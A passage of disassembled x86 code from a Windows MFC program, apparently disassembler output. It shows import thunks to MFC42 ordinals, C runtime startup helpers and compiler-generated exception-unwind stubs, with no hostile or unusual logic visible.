jmp [ Ordinal_MFC42_5241@IAT ]
Ordinal_MFC42_2385
jmp [ Ordinal_MFC42_2385@IAT ]
Ordinal_MFC42_5163
jmp [ Ordinal_MFC42_5163@IAT ]
Ordinal_MFC42_6374
jmp [ Ordinal_MFC42_6374@IAT ]
Ordinal_MFC42_4353
jmp [ Ordinal_MFC42_4353@IAT ]
Ordinal_MFC42_5280
jmp [ Ordinal_MFC42_5280@IAT ]
Ordinal_MFC42_3798
jmp [ Ordinal_MFC42_3798@IAT ]
Ordinal_MFC42_4837
jmp [ Ordinal_MFC42_4837@IAT ]
Ordinal_MFC42_4441
jmp [ Ordinal_MFC42_4441@IAT ]
Ordinal_MFC42_2648
jmp [ Ordinal_MFC42_2648@IAT ]
Ordinal_MFC42_2055
jmp [ Ordinal_MFC42_2055@IAT ]
Ordinal_MFC42_6376
jmp [ Ordinal_MFC42_6376@IAT ]
Ordinal_MFC42_3749
jmp [ Ordinal_MFC42_3749@IAT ]
Ordinal_MFC42_5065
jmp [ Ordinal_MFC42_5065@IAT ]
Ordinal_MFC42_1727
jmp [ Ordinal_MFC42_1727@IAT ]
Ordinal_MFC42_5261
jmp [ Ordinal_MFC42_5261@IAT ]
Ordinal_MFC42_2446
jmp [ Ordinal_MFC42_2446@IAT ]
Ordinal_MFC42_2124
jmp [ Ordinal_MFC42_2124@IAT ]
Ordinal_MFC42_5277
jmp [ Ordinal_MFC42_5277@IAT ]
Ordinal_MFC42_4627
jmp [ Ordinal_MFC42_4627@IAT ]
Ordinal_MFC42_4425
jmp [ Ordinal_MFC42_4425@IAT ]
Ordinal_MFC42_3597
jmp [ Ordinal_MFC42_3597@IAT ]
Ordinal_MFC42_324
jmp [ Ordinal_MFC42_324@IAT ]
Ordinal_MFC42_1146
jmp [ Ordinal_MFC42_1146@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
Ordinal_MFC42_540
jmp [ Ordinal_MFC42_540@IAT ]
Ordinal_MFC42_2642
jmp [ Ordinal_MFC42_2642@IAT ]
Ordinal_MFC42_6199
jmp [ Ordinal_MFC42_6199@IAT ]
Ordinal_MFC42_3092
jmp [ Ordinal_MFC42_3092@IAT ]
Ordinal_MFC42_860
jmp [ Ordinal_MFC42_860@IAT ]
Ordinal_MFC42_4160
jmp [ Ordinal_MFC42_4160@IAT ]
Ordinal_MFC42_2863
jmp [ Ordinal_MFC42_2863@IAT ]
Ordinal_MFC42_2379
jmp [ Ordinal_MFC42_2379@IAT ]
Ordinal_MFC42_755
jmp [ Ordinal_MFC42_755@IAT ]
Ordinal_MFC42_470
jmp [ Ordinal_MFC42_470@IAT ]
Ordinal_MFC42_3177
jmp [ Ordinal_MFC42_3177@IAT ]
Ordinal_MFC42_2515
jmp [ Ordinal_MFC42_2515@IAT ]
Ordinal_MFC42_355
jmp [ Ordinal_MFC42_355@IAT ]
Ordinal_MFC42_4224
jmp [ Ordinal_MFC42_4224@IAT ]
Ordinal_MFC42_3874
jmp [ Ordinal_MFC42_3874@IAT ]
Ordinal_MFC42_2818
jmp [ Ordinal_MFC42_2818@IAT ]
sub_40232a
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_402356
push [ esp + 0x4 ]
call sub_40232a
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4024e0
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_4024f2
xor eax eax
retn
sub_4024f5
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_402502
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_402548
jmp sub_402548
sub_402548
push 0x600
push 0x0
call sub_40251a
mov [ rw-data ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
sub_402560
mov eax [ ebp - 0x14 ]
push eax
call Ordinal_MFC42_825
pop ecx
retn
sub_40256b
mov eax r--data
jmp __CxxFrameHandler
sub_402580
lea ecx [ ebp - 0x73c ]
jmp j_sub_4010a0
sub_40258b
lea ecx [ ebp - 0x7a4 ]
jmp sub_401810
sub_402596
lea ecx [ ebp - 0x7a4 ]
jmp Ordinal_MFC42_641
sub_4025a1
mov eax r--data
jmp __CxxFrameHandler
sub_4025b0
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_641
sub_4025b8
mov eax r--data
jmp __CxxFrameHandler
sub_4025d0
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_641
sub_4025d8
mov ecx [ ebp - 0x10 ]
add ecx 0x60
jmp Ordinal_MFC42_800
sub_4025e3
mov eax r--data
jmp __CxxFrameHandler
sub_4025f0
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_4025f8
lea ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_800
sub_402600
mov eax r--data
jmp __CxxFrameHandler
sub_402610
lea ecx [ ebp - 0x6c ]
jmp sub_4018c0
sub_402618
mov eax r--data
jmp __CxxFrameHandler
sub_402630
lea ecx [ ebp - 0x208 ]
jmp sub_401d20
sub_40263b
lea ecx [ ebp - 0x20c ]
jmp Ordinal_MFC42_800
sub_402646
lea ecx [ ebp - 0x208 ]
jmp sub_4018c0
sub_402651
mov eax r--data
jmp __CxxFrameHandler
sub_402660
mov ecx [ ebp - 0x10 ]
jmp sub_4018c0
sub_402668
mov eax r--data
jmp __CxxFrameHandler
sub_402680
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_402688
mov eax r--data
jmp __CxxFrameHandler
sub_4026a0
lea ecx [ ebp - 0x94 ]
jmp sub_402000
sub_4026ab
lea ecx [ ebp - 0x98 ]
jmp Ordinal_MFC42_800
sub_4026b6
mov eax r--data
jmp __CxxFrameHandler
